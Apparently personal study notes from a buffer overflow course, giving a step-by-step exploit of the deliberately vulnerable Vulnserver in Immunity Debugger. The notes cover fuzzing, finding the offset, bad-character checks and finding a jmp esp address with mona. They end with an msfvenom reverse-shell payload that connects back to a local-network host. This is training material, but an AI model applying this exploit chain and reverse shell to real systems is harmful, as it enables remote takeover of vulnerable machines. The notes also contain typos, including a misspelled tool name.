# Buffer Overflow from the cybermentor
## Immunity debugger, Vulnserver

# Memory 
* Kernel
* Stack
* * ESP (extended stack pointer)
* * Buffer Space (oevrflower until EIP)
* * EBP (Extended Base Pointer)
* * EIP (Extended Intrst Poiter)/ Return addres
* Heap
* Data

# Process
* attach vulnserver to immunity debugger
* testing each input field for overflow error
* `generic_send_tcp IP PORT trun.spk 0 0`
trun.spk
```
s_readline();
s_string("STATS ");
s_string_variable("0");
```
* use `tools/bufferoverflow/fuzz1.py` to estimate overflow => 3000
* `msf-pattern_create -l 3000` copy out put to `tools/bufferoverflow/offset1.py` and run
* get eip address => `386F4337`, use address to get exact offset `msf-pattern_offset -l 3000 -q 386F4337` => 2003
* confirm you own the eip with offset2.py
* Find badchar with `badchar.py`, right click in esp and follow dump (then check for out of place chars) (exclude when generating payload)
* use mona module to find unprotected dlls (https://github.com/corelan/mona) add `mona.py` to `x86/immunity inc/immunity Debugger/PyCommands`
* attach vulnserver.exe -> enter `!mona modules` to the input field bellow
* find dll with no protection (false * 5) (essfunc.dll)
* use `msf-nams_shell` for `jmp esp` assembly => FFE4 (skip)
* enter `!mona find -s "\xff\xe4" -m essfunc.dll` take return address 0x6XXXXX
* on home page click `right arrow facing doted line` pass the address 6XXXXX then press f2 to set breaking point
* `shellcode = 'A' * 2003 + "\xaf\x11\x50\x62"` ctrleip.py (in reverse because it's endian)
* `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.183.128 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"` - generate raw shell code for `exploit.py`
* `shellcode = 'A' * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow` 
* * "\x90" => nop (padding)
